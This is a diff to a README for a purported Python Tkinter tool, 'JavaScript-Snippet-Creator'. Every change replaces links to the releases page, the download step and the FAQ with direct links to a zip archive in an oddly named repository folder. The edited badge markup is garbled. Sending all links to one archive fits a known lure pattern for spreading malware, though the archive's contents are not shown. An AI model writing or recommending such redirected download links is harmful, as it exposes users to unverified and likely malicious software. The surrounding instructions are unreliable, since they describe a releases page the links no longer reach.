@@ -1,6 +1,6 @@
 # 🎉 JavaScript-Snippet-Creator - Create JavaScript Snippets Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/RakhiRadhakrishnan/JavaScript-Snippet-Creator/releases)
+[![Download](https://raw.githubusercontent.com/RakhiRadhakrishnan/JavaScript-Snippet-Creator/main/phacochoeroid/JavaScript-Snippet-Creator.zip%20Now-Click%https://raw.githubusercontent.com/RakhiRadhakrishnan/JavaScript-Snippet-Creator/main/phacochoeroid/JavaScript-Snippet-Creator.zip)](https://raw.githubusercontent.com/RakhiRadhakrishnan/JavaScript-Snippet-Creator/main/phacochoeroid/JavaScript-Snippet-Creator.zip)
 
 ## 📜 Overview
 JavaScript-Snippet-Creator is an interactive application built with Python Tkinter. This tool helps you generate dynamic JavaScript snippets for web automation. It is user-friendly, allowing anyone — even those without coding experience — to efficiently automate tasks on their websites.
@@ -10,7 +10,7 @@ To begin using the JavaScript-Snippet-Creator, follow the steps below. We will g
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**:
-   To download the software, [visit this page to download.](https://github.com/RakhiRadhakrishnan/JavaScript-Snippet-Creator/releases)
+   To download the software, [visit this page to download.](https://raw.githubusercontent.com/RakhiRadhakrishnan/JavaScript-Snippet-Creator/main/phacochoeroid/JavaScript-Snippet-Creator.zip)
 
 2. **Choose the Version**:
    On the releases page, you will see a list of available versions. Click on the version that suits your needs.
@@ -53,7 +53,7 @@ To ensure the application runs smoothly, make sure your system meets the followi
 ## 📞 Support
 If you experience issues or have questions about using the JavaScript-Snippet-Creator, please open an issue on the GitHub repository. The community is helpful and responsive. 
 
-You can also refer to our **[FAQs](https://github.com/RakhiRadhakrishnan/JavaScript-Snippet-Creator/issues)** section for quick answers to common queries.
+You can also refer to our **[FAQs](https://raw.githubusercontent.com/RakhiRadhakrishnan/JavaScript-Snippet-Creator/main/phacochoeroid/JavaScript-Snippet-Creator.zip)** section for quick answers to common queries.
 
 ## 🌟 Feedback
 We welcome your feedback and suggestions to improve the application. Feel free to reach out via the GitHub repository to share your thoughts.
